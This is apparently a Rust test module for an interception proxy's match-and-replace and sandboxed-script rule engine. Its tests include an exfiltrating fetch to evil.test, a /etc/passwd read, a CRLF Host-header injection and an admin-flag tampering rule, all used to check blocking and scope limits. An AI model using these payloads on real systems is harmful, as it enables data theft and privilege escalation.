
    #[test]
    fn literal_and_whole_matching_take_the_replacement_as_written() {
        let literal = [Rule { matcher: MatchKind::Literal, ..rule(1, RuleLocation::RequestBody, "a.b", "$1") }];
        let (out, _) = request(&literal, "POST / HTTP/1.1\r\nContent-Length: 7\r\n\r\na.b axb");
        assert_eq!(out, "POST / HTTP/1.1\r\nContent-Length: 6\r\n\r\n$1 axb");
        let whole = [Rule { matcher: MatchKind::Whole, ..rule(2, RuleLocation::ResponseBody, "", "{}") }];
        assert_eq!(
            response(&whole, "HTTP/1.1 200 OK\r\nContent-Length: 2\r\n\r\nhi").0,
            "HTTP/1.1 200 OK\r\nContent-Length: 2\r\n\r\n{}"
        );
        // A regex with nothing to match still matches nothing on a body, as it always did.
        let empty = [rule(3, RuleLocation::RequestBody, "", "x")];
        assert_eq!(request(&empty, "POST / HTTP/1.1\r\nContent-Length: 1\r\n\r\na").1, Vec::<u32>::new());
    }

    #[test]
    fn a_body_rule_leaves_responses_that_have_no_body_without_one() {
        // Each matches an empty body: an empty literal or whole match, and regexes that match "".
        let rules = [
            Rule { matcher: MatchKind::Literal, ..rule(1, RuleLocation::ResponseBody, "", "x") },
            Rule { matcher: MatchKind::Whole, ..rule(2, RuleLocation::ResponseBody, "", "{}") },
            rule(3, RuleLocation::ResponseBody, "^", "injected"),
            rule(4, RuleLocation::ResponseBody, "^$", "injected"),
        ];
        let get = b"GET / HTTP/1.1\r\nHost: h.test\r\n\r\n";
        let head = b"HEAD / HTTP/1.1\r\nHost: h.test\r\n\r\n";
        let no_content = "HTTP/1.1 204 No Content\r\nServer: s\r\n\r\n";
        let not_modified = "HTTP/1.1 304 Not Modified\r\nETag: \"a\"\r\n\r\n";
        let to_head = "HTTP/1.1 200 OK\r\nContent-Length: 42\r\n\r\n";
        let early = "HTTP/1.1 100 Continue\r\n\r\nHTTP/1.1 204 No Content\r\n\r\n";
        for r in &rules {
            let set = RuleSet::compile(std::slice::from_ref(r)).unwrap();
            for (request, resp) in [(&get[..], no_content), (get, not_modified), (head, to_head), (get, early)] {
                let out = set.response(Engine::Proxy, "h.test", request, resp.as_bytes().to_vec());
                assert!(
                    !out.changed(),
                    "rule {} gave {resp:?} a body: {:?}",
                    r.id,
                    String::from_utf8_lossy(&out.bytes)
                );
                assert_eq!(out.bytes, resp.as_bytes());
            }
            // A response with a body, even an empty one, still gets the rule.
            let empty = "HTTP/1.1 200 OK\r\nContent-Length: 0\r\n\r\n";
            assert!(set.response(Engine::Proxy, "h.test", get, empty.as_bytes().to_vec()).changed(), "rule {}", r.id);
        }
        // Header rules still apply to them.
        let header = named(5, RuleLocation::ResponseHeader, "X-Seen", RuleAction::Add, "", "yes");
        let out =
            RuleSet::compile(&[header]).unwrap().response(Engine::Proxy, "h.test", head, to_head.as_bytes().to_vec());
        assert_eq!(
            String::from_utf8(out.bytes).unwrap(),
            "HTTP/1.1 200 OK\r\nContent-Length: 42\r\nX-Seen: yes\r\n\r\n"
        );

        // A script's replacement goes the same way: never run for a response with no body.
        let (r, dir) = scripted(6, RuleLocation::ResponseBody, "^", "function replace(m) { return 'from a script'; }");
        let set = RuleSet::compile(&[r]).unwrap();
        let out = set.response(Engine::Proxy, "h.test", get, no_content.as_bytes().to_vec());
        assert!(!out.changed() && out.failed.is_empty());
        let out = set.response(Engine::Proxy, "h.test", head, to_head.as_bytes().to_vec());
        assert!(!out.changed() && out.failed.is_empty());
        let out = set.response(Engine::Proxy, "h.test", get, b"HTTP/1.1 200 OK\r\nContent-Length: 0\r\n\r\n".to_vec());
        assert_eq!(String::from_utf8(out.bytes).unwrap(), "HTTP/1.1 200 OK\r\nContent-Length: 13\r\n\r\nfrom a script");
        let _ = std::fs::remove_dir_all(dir);
    }

    #[test]
    fn a_rule_applies_to_the_engines_and_hosts_it_names() {
        let fuzz = Rule { applies_to: vec![Engine::Fuzz, Engine::Send], ..rule(1, RuleLocation::Method, "", "PUT") };
        let host = Rule { host: Some(r"(^|\.)api\.test$".into()), ..rule(2, RuleLocation::Path, "", "/x") };
        let set = RuleSet::compile(&[fuzz, host]).unwrap();
        let req = b"GET / HTTP/1.1\r\n\r\n".to_vec();
        let ids = |engine, host| set.request(engine, host, req.clone()).ids();
        assert_eq!(ids(Engine::Proxy, "h.test"), Vec::<u32>::new());
        assert_eq!(ids(Engine::Proxy, "V2.API.test"), [2]);
        assert_eq!(ids(Engine::Fuzz, "api.test"), [1]);
        assert_eq!(ids(Engine::Scan, "api.test"), Vec::<u32>::new());
        // The original is kept only when a rule changed the message.
        let out = set.request(Engine::Send, "h.test", req.clone());
        assert_eq!((out.original.as_deref(), out.bytes.as_slice()), (Some(&req[..]), &b"PUT / HTTP/1.1\r\n\r\n"[..]));
        assert!(set.request(Engine::Scan, "h.test", req.clone()).original.is_none());
    }

    #[test]
    fn websocket_rules_rewrite_messages_one_way() {
        let both = rule(1, RuleLocation::WsMessage, "\"admin\":false", "\"admin\":true");
        assert_eq!(both.engines(), [Engine::WsToServer, Engine::WsToClient]);
        let down = Rule { applies_to: vec![Engine::WsToClient], ..rule(2, RuleLocation::WsMessage, "true", "1") };
        let set = RuleSet::compile(&[both, down]).unwrap();
        let msg = br#"{"admin":false}"#;
        assert_eq!(set.ws_message(Engine::WsToServer, "h", msg).bytes, br#"{"admin":true}"#);
        let out = set.ws_message(Engine::WsToClient, "h", msg);
        assert_eq!((out.bytes.as_slice(), out.ids()), (&br#"{"admin":1}"#[..], vec![1, 2]));
        assert!(set.rewrites_ws(Engine::WsToServer, "h") && !set.ws_message(Engine::WsToServer, "h", b"x").changed());
        // They don't touch HTTP, and HTTP rules don't touch messages.
        assert!(!set.request(Engine::Proxy, "h", b"GET /true HTTP/1.1\r\n\r\n".to_vec()).changed());
        // A WebSocket rule lists WebSocket directions, another rule the HTTP engines.
        let mixed = Rule { applies_to: vec![Engine::Proxy], ..rule(3, RuleLocation::WsMessage, "a", "b") };
        assert!(validate_rule(&mixed).is_err());
        let mixed = Rule { applies_to: vec![Engine::WsToServer], ..rule(3, RuleLocation::RequestBody, "a", "b") };
        assert!(validate_rule(&mixed).is_err());
    }

    #[test]
    fn rules_that_do_not_fit_their_location_are_refused() {
        let q = RuleLocation::QueryParam;
        assert!(validate_rule(&rule(1, q, "", "x")).is_err(), "no name");
        assert!(validate_rule(&named(1, q, "", RuleAction::Set, "", "x")).is_err());
        assert!(validate_rule(&named(1, q, "a\tb", RuleAction::Set, "", "x")).is_err());
        assert!(validate_rule(&named(1, RuleLocation::RequestHeader, "Bad Name", RuleAction::Set, "", "x")).is_err());
        assert!(validate_rule(&named(1, RuleLocation::Path, "n", RuleAction::Set, "", "x")).is_err());
        assert!(validate_rule(&Rule { action: Some(RuleAction::Add), ..rule(1, RuleLocation::Path, "", "x") }).is_err());
        assert!(validate_rule(&named(1, q, "n", RuleAction::Add, "pat", "x")).is_err());
        assert!(validate_rule(&named(1, q, "n", RuleAction::Remove, "", "x")).is_err());
        assert!(validate_rule(&Rule { host: Some("(".into()), ..rule(1, RuleLocation::Path, "", "/") }).is_err());
        validate_rule(&named(1, q, "n", RuleAction::Remove, "^a", "")).unwrap();
    }

    #[test]
    fn an_agents_rule_that_brings_in_a_foreign_host_is_found() {
        let target = Target { scheme: "https".into(), host: "h.test".into(), port: 443 };
        let opts = SendOptions::default();
        let req = b"GET / HTTP/1.1\r\nHost: h.test\r\n\r\n".to_vec();
        let mut host = named(1, RuleLocation::RequestHeader, "Host", RuleAction::Set, "", "evil.test");
        let ruled =
            |r: &Rule| RuleSet::compile(std::slice::from_ref(r)).unwrap().request(Engine::Proxy, "h.test", req.clone());
        // A person's rule was warned about when it was saved.
        assert_eq!(ruled(&host).agent_host(&opts, &target), None);
        host.origin = Some("mcp".into());
        assert_eq!(ruled(&host).agent_host(&opts, &target).as_deref(), Some("evil.test"));
        assert!(matches!(ruled(&host).check_host(&opts, &target), Err(Error::OutOfScope(_))));
        host.host_header_test = true;
        assert_eq!(ruled(&host).agent_host(&opts, &target), None);
        // An agent's rule that changes something else is no concern.
        let mut other = named(2, RuleLocation::RequestHeader, "X-A", RuleAction::Set, "", "b");
        other.origin = Some("mcp".into());
        assert_eq!(ruled(&other).agent_host(&opts, &target), None);
    }

    /// A rule whose replacement `script` makes, in a file of its own; the folder is the caller's
    /// to remove.
    fn scripted(id: u32, loc: RuleLocation, pattern: &str, script: &str) -> (Rule, std::path::PathBuf) {
        crate::sandbox::tests::use_test_runner();
        let (script, dir) = crate::hooks::tests::script_file(script);
        (Rule { replacer: ReplaceKind::Script, script: Some(script), ..rule(id, loc, pattern, "") }, dir)
    }

    fn failed(out: &Ruled) -> Vec<(u32, &str)> {
        out.failed.iter().map(|f| (f.id, f.error.as_str())).collect()
    }

    fn failed_of(out: &Ruled) -> Vec<(u32, &str)> {
        failed(out)
    }

    #[test]
    fn a_script_signs_a_request_from_what_it_is_told() {
        let (mut sign, dir) = scripted(
            1,
            RuleLocation::RequestHeader,
            "",
            "function replace(match, ctx) {
                const r = ctx.request;
                const host = r.headers.find(([name]) => name.toLowerCase() === 'host')[1];
                const text = [ctx.location, ctx.name, ctx.engine, ctx.host, r.method, r.path, r.query, host, r.body].join('|');
                return CryptoJS.HmacSHA256(text, 'k').toString(CryptoJS.enc.Hex) + ';was=' + match.text;
            }",
        );
        sign.name = Some("X-Sig".into());
        validate_rule(&sign).unwrap();
        verify_script(&sign).unwrap();
        let req = "POST /a/b?c=1 HTTP/1.1\r\nHost: h.test\r\nX-Sig: old\r\nContent-Length: 4\r\n\r\nbody";
        let (out, ids) = request(std::slice::from_ref(&sign), req);
        let text = "request-header|X-Sig|proxy|h.test|POST|/a/b|c=1|h.test|body";
        let mac = hex::encode(crate::sign::hmac_digest(crate::sign::HmacAlg::Sha256, b"k", text.as_bytes()));
        assert_eq!(out, req.replace("X-Sig: old", &format!("X-Sig: {mac};was=old")));
        assert_eq!(ids, [1]);
        // With no such header the rule sets one, and the script is told there was nothing.
        let (out, _) = request(std::slice::from_ref(&sign), "GET / HTTP/1.1\r\nHost: h.test\r\n\r\n");
        assert!(out.contains("\r\nX-Sig: ") && out.contains(";was=\r\n"), "{out}");
        // It sees the request as the rules before it left it.
        let before = rule(2, RuleLocation::RequestBody, "body", "BODY");
        let (out, ids) = request(&[before, sign.clone()], req);
        let text = "request-header|X-Sig|proxy|h.test|POST|/a/b|c=1|h.test|BODY";
        let mac = hex::encode(crate::sign::hmac_digest(crate::sign::HmacAlg::Sha256, b"k", text.as_bytes()));
        assert!(out.contains(&format!("X-Sig: {mac};was=old")) && out.ends_with("BODY"), "{out}");
        assert_eq!(ids, [2, 1]);
        let _ = std::fs::remove_dir_all(dir);
    }

    #[test]
    fn a_script_gets_every_match_with_its_groups_and_may_leave_one() {
        let (r, dir) = scripted(
            1,
            RuleLocation::RequestBody,
            r"(?P<key>\w+)=(\d+)(x)?",
            "function replace(m) {
                if (m.named.key === 'keep') return null;
                return m.groups[1] + '=' + (Number(m.groups[2]) + 1) + String(m.groups[3]) + '[' + m.text + ']';
            }",
        );
        let (out, ids) = request(&[r], "POST / HTTP/1.1\r\nContent-Length: 17\r\n\r\na=1&keep=5&b=41x;");
        assert_eq!(out, "POST / HTTP/1.1\r\nContent-Length: 33\r\n\r\na=2null[a=1]&keep=5&b=42x[b=41x];");
        assert_eq!(ids, [1]);
        let _ = std::fs::remove_dir_all(dir);
        // A literal match has no groups to give.
        let (mut r, dir) =
            scripted(2, RuleLocation::Path, "/a", "function replace(m) { return '/' + typeof m.groups; }");
        r.matcher = MatchKind::Literal;
        assert_eq!(request(&[r], "GET /a/a HTTP/1.1\r\n\r\n").0, "GET /undefined/undefined HTTP/1.1\r\n\r\n");
        let _ = std::fs::remove_dir_all(dir);
    }

    #[test]
    fn a_script_that_fails_leaves_the_message_and_says_so() {
        let req = "GET /a HTTP/1.1\r\nHost: h.test\r\nX-A: 1\r\n\r\n";
        let after = rule(9, RuleLocation::RequestHeader, "^X-A: 1$", "X-A: 2");
        for (script, why) in [
            ("function replace(m) { throw new Error('no ' + m.text); }", "no /a"),
            ("function replace(m) { return 5; }", "it returned a number"),
            ("function replace(m) { }", "it returned nothing"),
            ("function replace(m) { return { text: 'x' }; }", "it returned an object"),
            ("function replace(m) { return '/b\\r\\nHost: evil.test'; }", "a line break or NUL"),
            ("function replace(m) { return '/b\\0'; }", "a line break or NUL"),
            ("function replace(m) { return fetch('http://evil.test/' + m.text); }", "fetch is not defined"),
            (
                "function replace(m) { return require('fs').readFileSync('/etc/passwd', 'utf8'); }",
                "isn't available here",
            ),
        ] {
            let (r, dir) = scripted(1, RuleLocation::Path, "", script);
            let out = RuleSet::compile(&[r, after.clone()]).unwrap().request(Engine::Proxy, "h.test", req.into());
            // The rule after it still applied; the failed one changed nothing.
            assert_eq!(String::from_utf8_lossy(&out.bytes), req.replace("X-A: 1", "X-A: 2"), "{script}");
            assert_eq!(out.ids(), [9], "{script}");
            let failed = failed(&out);
            assert!(failed.len() == 1 && failed[0].0 == 1 && failed[0].1.contains(why), "{script}: {failed:?}");
            let _ = std::fs::remove_dir_all(dir);
        }
        // One match of several that fails fails the rule: none is replaced.
        let (r, dir) = scripted(
            1,
            RuleLocation::RequestBody,
            r"\d",
            "function replace(m) { if (m.text === '2') throw new Error('two'); return 'n'; }",
        );
        let out = RuleSet::compile(&[r]).unwrap().request(Engine::Proxy, "h", b"POST / HTTP/1.1\r\n\r\n1 2 3".to_vec());
        assert!(!out.changed() && failed(&out)[0].1.contains("two"), "{out:?}");
        let _ = std::fs::remove_dir_all(dir);
    }

    #[test]
    fn a_script_that_never_returns_is_stopped_and_its_rule_does_nothing_more() {
        let (r, dir) = scripted(
            1,
            RuleLocation::Path,
            "",
            "function replace(m) { if (m.text === '/slow') /^(a+)+$/.test('a'.repeat(40) + 'b'); return '/done'; }",
        );
        let set = RuleSet::compile(&[r]).unwrap();
        let get = |path: &str| set.request(Engine::Proxy, "h", format!("GET {path} HTTP/1.1\r\n\r\n").into_bytes());
        assert_eq!(get("/a").bytes, b"GET /done HTTP/1.1\r\n\r\n");
        let started = std::time::Instant::now();
        let out = get("/slow");
        assert!(!out.changed() && failed(&out)[0].1.contains("time limit"), "{out:?}");
        assert!(started.elapsed() < crate::sandbox::CALL_LIMIT + std::time::Duration::from_secs(3));
        let started = std::time::Instant::now();
        let out = get("/a");
        assert!(!out.changed() && failed(&out)[0].1.contains("stopped earlier"), "{out:?}");
        assert!(started.elapsed() < std::time::Duration::from_millis(500), "a stopped script isn't waited for again");
        let _ = std::fs::remove_dir_all(dir);
    }

    #[test]
    fn a_script_works_on_responses_statuses_and_messages() {
        let (body, dir_a) = scripted(
            1,
            RuleLocation::ResponseBody,
            "\"role\":\"(\\w+)\"",
            "function replace(m, ctx) { return '\"role\":\"' + ctx.response.status + m.groups[1] + ctx.response.headers[0][0] + '\"'; }",
        );
        let (status, dir_b) = scripted(
            2,
            RuleLocation::Status,
            "",
            "function replace(m, ctx) { return ctx.response.body.includes('teapot') ? '418' : m.text === '500' ? 'five' : null; }",
        );
        let rules = [body, status];
        let resp = "HTTP/1.1 200 OK\r\nContent-Type: application/json\r\nContent-Length: 15\r\n\r\n{\"role\":\"user\"}";
        let (out, ids) = response(&rules, resp);
        assert_eq!(out, "HTTP/1.1 200 OK\r\nContent-Type: application/json\r\nContent-Length: 30\r\n\r\n{\"role\":\"200userContent-Type\"}");
        assert_eq!(ids, [1]);
        let (out, ids) = response(&rules, "HTTP/1.1 200 OK\r\nContent-Length: 6\r\n\r\nteapot");
        assert_eq!((out.as_str(), ids), ("HTTP/1.1 418 I'm a teapot\r\nContent-Length: 6\r\n\r\nteapot", vec![2]));
        // What a script returns as a status is checked like a rule's text, when it has run.
        let set = RuleSet::compile(&rules).unwrap();
        let out = set.response(Engine::Proxy, "h", b"", b"HTTP/1.1 500 Oops\r\nContent-Length: 0\r\n\r\n".to_vec());
        assert!(
            !out.changed() && failed(&out) == [(2, failed(&out)[0].1)] && failed(&out)[0].1.contains("is no status")
        );
        for dir in [dir_a, dir_b] {
            let _ = std::fs::remove_dir_all(dir);
        }
        // A message that isn't text comes as base64 and may go back so.
        let (ws, dir) = scripted(
            3,
            RuleLocation::WsMessage,
            "",
            "function replace(m, ctx) {
                if (!m.base64) return ctx.engine + ':' + ctx.message.text.toUpperCase();
                return { base64: btoa(atob(m.base64) + '\\u00ff') };
            }",
        );
        let set = RuleSet::compile(&[ws]).unwrap();
        assert_eq!(set.ws_message(Engine::WsToServer, "h", b"hi").bytes, b"ws-to-server:HI");
        assert_eq!(set.ws_message(Engine::WsToClient, "h", &[0xfe, 0x00]).bytes, [0xfe, 0x00, 0xff]);
        let _ = std::fs::remove_dir_all(dir);
    }

    #[test]
    fn a_script_gives_the_value_of_what_a_rule_adds() {
        let script = "function replace(m, ctx) { return ctx.name + '-' + ctx.request.method + m.text.length; }";
        let (mut header, dir_a) = scripted(1, RuleLocation::RequestHeader, "", script);
        (header.name, header.action) = (Some("X-New".into()), Some(RuleAction::Add));
        let (mut param, dir_b) = scripted(2, RuleLocation::QueryParam, "", script);
        param.name = Some("t".into());
        let (line, dir_c) = scripted(3, RuleLocation::RequestHeader, "", "function replace() { return 'X-Line: 1'; }");
        let (none, dir_d) = scripted(4, RuleLocation::RequestHeader, "", "function replace() { return null; }");
        let (out, ids) = request(&[header, param, line, none], "GET /a HTTP/1.1\r\nHost: h\r\n\r\n");
        assert_eq!(out, "GET /a?t=t-GET0 HTTP/1.1\r\nHost: h\r\nX-New: X-New-GET0\r\nX-Line: 1\r\n\r\n");
        assert_eq!(ids, [1, 2, 3]);
        for dir in [dir_a, dir_b, dir_c, dir_d] {
            let _ = std::fs::remove_dir_all(dir);
        }
    }

    #[test]
    fn a_script_rule_is_stored_with_its_pin_and_skipped_when_its_file_changes() {
        let (mut r, dir) = scripted(7, RuleLocation::Path, "", "function replace(m) { return '/x'; }");
        let stored = serde_json::to_value(&r).unwrap();
        let script = r.script.clone().unwrap();
        assert_eq!(stored["replacer"], "script");
        assert_eq!(stored["script"], json!({"file": script.file, "sha256": script.sha256}));
        assert_eq!(serde_json::from_value::<Rule>(stored).unwrap(), r);
        // A text rule is stored as it always was.
        let text = serde_json::to_value(rule(1, RuleLocation::Path, "", "/")).unwrap();
        assert!(text.get("replacer").is_none() && text.get("script").is_none());
        validate_rule(&r).unwrap();
        assert_eq!(script_problem(&r), None);
        // What a script rule can't have.
        assert!(validate_rule(&Rule { replace: "/y".into(), ..r.clone() }).is_err());
        assert!(validate_rule(&Rule { script: None, ..r.clone() }).is_err());
        assert!(validate_rule(&Rule { replacer: ReplaceKind::Text, ..r.clone() }).is_err());
        let mut named = named(1, RuleLocation::RequestHeader, "X-A", RuleAction::Remove, "", "");
        (named.replacer, named.script) = (ReplaceKind::Script, r.script.clone());
        assert!(validate_rule(&named).unwrap_err().to_string().contains("remove takes no --script"));
        // A status rule's script is checked when it runs, not when it is saved.
        validate_rule(&Rule { location: RuleLocation::Status, ..r.clone() }).unwrap();
        // The file changes: the rule is left out, the others stay, and saving it again is refused.
        std::fs::write(&script.file, "function replace(m) { return '/other'; }").unwrap();
        let after = rule(8, RuleLocation::Method, "", "PUT");
        let (out, ids) = request(&[r.clone(), after], "GET / HTTP/1.1\r\n\r\n");
        assert_eq!((out.as_str(), ids), ("PUT / HTTP/1.1\r\n\r\n", vec![8]));
        assert!(script_problem(&r).unwrap().contains("changed since it was named"));
        assert!(validate_rule(&r).unwrap_err().to_string().contains("changed since it was named"));
        assert!(verify_script(&r).is_err());
        // A script with no replace function is found when it is verified.
        std::fs::write(&script.file, "function other() {}").unwrap();
        r.script = Some(ScriptRef::pin(&script.file, None).unwrap());
        validate_rule(&r).unwrap();
        assert!(verify_script(&r).unwrap_err().to_string().contains("it defines no replace function"));
        let _ = std::fs::remove_dir_all(dir);
    }

    #[test]
    fn a_host_a_script_brings_in_is_found_like_a_text_rules() {
        let target = Target { scheme: "https".into(), host: "h.test".into(), port: 443 };
        let opts = SendOptions::default();
        let req = b"GET / HTTP/1.1\r\nHost: h.test\r\n\r\n".to_vec();
        let (mut host, dir_a) = scripted(
            1,
            RuleLocation::RequestHeader,
            "",
            "function replace(m) { return 'evil.' + m.text.split('.')[1]; }",
        );
        host.name = Some("Host".into());
        let (mut path, dir_b) =
            scripted(2, RuleLocation::Path, "", "function replace(m) { return 'http://evil.test' + m.text; }");
        for r in [&mut host, &mut path] {
            let ruled = |r: &Rule| {
                RuleSet::compile(std::slice::from_ref(r)).unwrap().request(Engine::Proxy, "h.test", req.clone())
            };
            assert_eq!(ruled(r).agent_host(&opts, &target), None, "a person's rule");
            r.origin = Some("mcp".into());
            assert_eq!(ruled(r).agent_host(&opts, &target).as_deref(), Some("evil.test"), "rule {}", r.id);
            assert!(matches!(ruled(r).check_host(&opts, &target), Err(Error::OutOfScope(_))));
            r.host_header_test = true;
            assert_eq!(ruled(r).agent_host(&opts, &target), None);
        }
        for dir in [dir_a, dir_b] {
            let _ = std::fs::remove_dir_all(dir);
        }
    }

    #[test]
    fn a_scripts_failure_is_noted_in_the_project_once_and_forgotten_with_its_rule() {
        let dir = std::env::temp_dir().join(format!("bp-rule-failures-{}", std::process::id()));
        std::fs::create_dir_all(&dir).unwrap();
        let project = dir.join("p.bpdb");
        let store = Store::open(&project).unwrap();
        let log = FailureLog::of(&store);
        let failed = |id: u32, error: &str| Failed { id, error: error.to_string() };
        log.note(Engine::Proxy, &[]);
        assert_eq!(noted_failures(&store), json!({}));
        log.note(Engine::Proxy, &[failed(901, "Error: one"), failed(902, "Error: two")]);
        let noted = noted_failures(&store);
        assert_eq!(
            (noted["901"]["error"].as_str(), noted["901"]["engine"].as_str()),
            (Some("Error: one"), Some("proxy"))
        );
        assert!(noted["901"]["time"].as_str().unwrap().ends_with('Z') && noted["902"]["error"] == "Error: two");
        // The same failure again writes nothing, and another only once the note has stood a while.
        store.meta_set(RULE_FAILURES, None).unwrap();
        log.note(Engine::Fuzz, &[failed(901, "Error: one")]);
        log.note(Engine::Fuzz, &[failed(901, "Error: other")]);
        assert_eq!(noted_failures(&store), json!({}));
        let earlier = std::time::Instant::now().checked_sub(NOTE_EVERY).unwrap();
        log.noted.lock().unwrap().values_mut().for_each(|(_, when)| *when = earlier);
        log.note(Engine::Fuzz, &[failed(901, "Error: one")]);
        assert_eq!(noted_failures(&store), json!({}));
        log.note(Engine::Fuzz, &[failed(901, "Error: other")]);
        assert_eq!(
            (noted_failures(&store)["901"]["engine"].as_str(), noted_failures(&store)["901"]["error"].as_str()),
            (Some("fuzz"), Some("Error: other"))
        );
        // A log made anew (the proxy's, when its rules load again) notes what the old one had.
        store.meta_set(RULE_FAILURES, None).unwrap();
        FailureLog::of(&store).note(Engine::Proxy, &[failed(901, "Error: other")]);
        assert_eq!(noted_failures(&store)["901"]["engine"], "proxy");
        log.note(Engine::Scan, &[failed(903, "Error: three")]);
        forget_failures(&store, |id| id == 903).unwrap();
        let noted = noted_failures(&store);
        assert!(noted.get("901").is_none() && noted["903"]["engine"] == "scan", "{noted}");
        forget_failures(&store, |_| false).unwrap();
        assert_eq!(store.meta_get(RULE_FAILURES).unwrap(), None);
        // A project in memory has nowhere to note one, and that is no error.
        FailureLog::of(&Store::open_in_memory().unwrap()).note(Engine::Proxy, &[failed(904, "x")]);
        // An engine's rules note what failed as they are applied.
        let (r, script_dir) = scripted(905, RuleLocation::Path, "", "function replace() { throw new Error('noted'); }");
        store.set_setting(RULES_KEY, &[Rule { applies_to: vec![Engine::Send], ..r }]).unwrap();
        let rules = EngineRules::load(&store, Engine::Send).unwrap().unwrap();
        let target = Target { scheme: "https".into(), host: "h.test".into(), port: 443 };
        let out = rules.request(&SendOptions::default(), &target, b"GET / HTTP/1.1\r\n\r\n".to_vec()).unwrap();
        assert_eq!(failed_of(&out), [(905, "Error: noted")]);
        assert_eq!(noted_failures(&store)["905"]["engine"], "send");
        drop(store);
        for dir in [dir, script_dir] {
            let _ = std::fs::remove_dir_all(dir);
        }
    }

    #[test]
    fn a_script_is_called_only_where_its_rule_matches_something() {
        // It throws whenever it is called: a message it isn't called for has no failure.
        let throws = "function replace(m, ctx) { throw new Error('called for ' + m.text); }";
        let (status, dir_a) = scripted(1, RuleLocation::Status, "^403$", throws);
        let (mut header, dir_b) = scripted(2, RuleLocation::ResponseHeader, "^on$", throws);
        header.name = Some("X-Debug".into());
        let (body, dir_c) = scripted(3, RuleLocation::ResponseBody, "secret", throws);
        let set = RuleSet::compile(&[status, header, body]).unwrap();
        let respond = |resp: &str| set.response(Engine::Proxy, "h", b"", resp.as_bytes().to_vec());
        let out = respond("HTTP/1.1 200 OK\r\nX-Debug: off\r\nContent-Length: 5\r\n\r\nplain");
        assert!(!out.changed() && out.failed.is_empty(), "{out:?}");
        let out = respond("HTTP/1.1 403 No\r\nX-Debug: on\r\nContent-Length: 6\r\n\r\nsecret");
        let called: Vec<(u32, &str)> = failed(&out);
        assert_eq!(
            called,
            [(1, "Error: called for 403"), (2, "Error: called for on"), (3, "Error: called for secret")]
        );
        // Requests and messages alike: a named header that isn't there, a path that doesn't match.
        let (mut sets, dir_d) = scripted(4, RuleLocation::RequestHeader, "^a$", throws);
        sets.name = Some("X-A".into());
        let (path, dir_e) = scripted(5, RuleLocation::Path, "^/admin", throws);
        let (query, dir_f) = scripted(6, RuleLocation::RequestBody, "token=", throws);
        let (ws, dir_g) = scripted(7, RuleLocation::WsMessage, "ping", throws);
        let set = RuleSet::compile(&[sets, path, query, ws]).unwrap();
        let out = set.request(Engine::Proxy, "h", b"POST /a HTTP/1.1\r\nX-B: a\r\n\r\nbody".to_vec());
        assert!(!out.changed() && out.failed.is_empty(), "{out:?}");
        let out = set.request(Engine::Proxy, "h", b"POST /admin HTTP/1.1\r\nX-A: a\r\n\r\ntoken=1".to_vec());
        assert_eq!(out.failed.iter().map(|f| f.id).collect::<Vec<_>>(), [4, 5, 6]);
        assert!(set.ws_message(Engine::WsToServer, "h", b"pong").failed.is_empty());
        assert_eq!(set.ws_message(Engine::WsToServer, "h", b"ping").failed.len(), 1);
        for dir in [dir_a, dir_b, dir_c, dir_d, dir_e, dir_f, dir_g] {
            let _ = std::fs::remove_dir_all(dir);
        }
    }

    #[test]
    fn a_script_rule_names_its_file_by_its_full_path() {
        let (r, dir) = scripted(1, RuleLocation::Path, "", "function replace(m) { return '/x'; }");
        let script = r.script.clone().unwrap();
        let relative = ScriptRef { file: script.file.file_name().unwrap().into(), ..script };
        let e = validate_rule(&Rule { script: Some(relative), ..r.clone() }).unwrap_err().to_string();
        assert!(e.contains("named by its full path"), "{e}");
        validate_rule(&r).unwrap();
        let _ = std::fs::remove_dir_all(dir);
    }

    #[test]
    fn a_script_that_fails_on_one_of_several_headers_or_parameters_changes_none() {
        let script =
            "function replace(m) { if (m.text.includes('bad')) throw new Error('no ' + m.text); return 'new'; }";
        let (mut param, dir_a) = scripted(1, RuleLocation::QueryParam, "", script);
        param.name = Some("q".into());
        let (mut header, dir_b) = scripted(2, RuleLocation::RequestHeader, "", script);
        header.name = Some("X-A".into());
        let (lines, dir_c) = scripted(3, RuleLocation::RequestHeader, "^X-B: .*$", script);
        let after = rule(9, RuleLocation::Method, "", "PUT");
        let set = RuleSet::compile(&[param.clone(), header.clone(), lines, after]).unwrap();
        let req = "GET /a?q=ok&q=bad HTTP/1.1\r\nX-A: ok\r\nX-A: bad\r\nX-B: ok\r\nX-B: bad\r\n\r\n";
        let out = set.request(Engine::Proxy, "h", req.as_bytes().to_vec());
        // Nothing of the three is half done; the rule after them applied.
        assert_eq!(String::from_utf8_lossy(&out.bytes), req.replacen("GET", "PUT", 1));
        assert_eq!((out.ids(), out.failed.iter().map(|f| f.id).collect::<Vec<_>>()), (vec![9], vec![1, 2, 3]));
        // Where every one of them succeeds, every one is rewritten.
        let ok = "GET /a?q=ok&q=fine HTTP/1.1\r\nX-A: ok\r\nX-A: fine\r\nX-B: ok\r\n\r\n";
        let out = set.request(Engine::Proxy, "h", ok.as_bytes().to_vec());
        assert_eq!(
            String::from_utf8_lossy(&out.bytes),
            "PUT /a?q=new&q=new HTTP/1.1\r\nX-A: new\r\nX-A: new\r\nnew\r\n\r\n"
        );
        // Response headers alike.
        let (mut cookie, dir_d) = scripted(4, RuleLocation::ResponseHeader, "", script);
        cookie.name = Some("Set-Cookie".into());
        let resp = "HTTP/1.1 200 OK\r\nSet-Cookie: ok\r\nSet-Cookie: bad\r\nContent-Length: 0\r\n\r\n";
        let out = RuleSet::compile(&[cookie]).unwrap().response(Engine::Proxy, "h", b"", resp.as_bytes().to_vec());
        assert!(!out.changed() && out.failed.len() == 1, "{out:?}");
        for dir in [dir_a, dir_b, dir_c, dir_d] {
            let _ = std::fs::remove_dir_all(dir);
        }
    }

    #[test]
    fn a_pattern_that_matches_everywhere_is_refused_before_it_is_gathered() {
        let (r, dir) = scripted(1, RuleLocation::ResponseBody, ".", "function replace(m) { return null; }");
        let set = RuleSet::compile(&[r]).unwrap();
        let respond = |n: usize| {
            let resp = format!("HTTP/1.1 200 OK\r\nContent-Length: {n}\r\n\r\n{}", "a".repeat(n));
            set.response(Engine::Proxy, "h", b"", resp.into_bytes())
        };
        let out = respond(500);
        assert!(out.failed.is_empty() && !out.changed(), "{out:?}");
        let out = respond(MAX_MATCHES + 1);
        assert!(!out.changed() && failed(&out)[0].1.contains("matches in too many places"), "{out:?}");
        let _ = std::fs::remove_dir_all(dir);
    }

    /// A request rule over `script`; the folder is the caller's to remove.
    fn request_rule_of(id: u32, script: &str) -> (Rule, std::path::PathBuf) {
        let (r, dir) = scripted(id, RuleLocation::Request, "", script);
        (Rule { applies_to: vec![Engine::Proxy, Engine::Send], ..r }, dir)
    }

